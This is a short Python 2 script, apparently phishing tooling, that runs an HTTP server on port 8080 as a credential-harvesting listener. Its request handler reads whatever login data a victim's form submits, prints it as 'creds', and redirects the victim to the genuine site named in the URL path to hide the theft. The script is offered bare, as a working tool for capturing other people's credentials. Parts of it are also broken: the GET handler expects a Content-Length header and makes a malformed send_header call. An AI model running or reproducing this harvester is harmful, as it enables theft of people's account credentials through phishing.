#!/usr/bin/env python
import SimpleHTTPServer
import SocketServer
import urllib

class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
	def do_POST(self):
		content_length = int(self.headers['Content-Length'])
		creds = self.rfile.read(content_length).decode('utf-8')
		print creds
		site = self.path[1:]
		self.send_response(301)
		self.send_header('Location', urllib.unquote(site))
		self.end_headers()

	def do_GET(self):
		headers = self.headers
		content_length = int(self.headers['Content-Length'])
		creds = self.rfile.read(content_length).decode('utf-8')
		print creds
		site = self.path[1:]
		self.send_response(301)
		self.send_header('Location', urllib.unquote(site))
		self.send_header('')
		self.end_headers()


server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
try:
    print 'Use Control-C to exit'
    server.serve_forever()
except KeyboardInterrupt:
    print 'Exiting'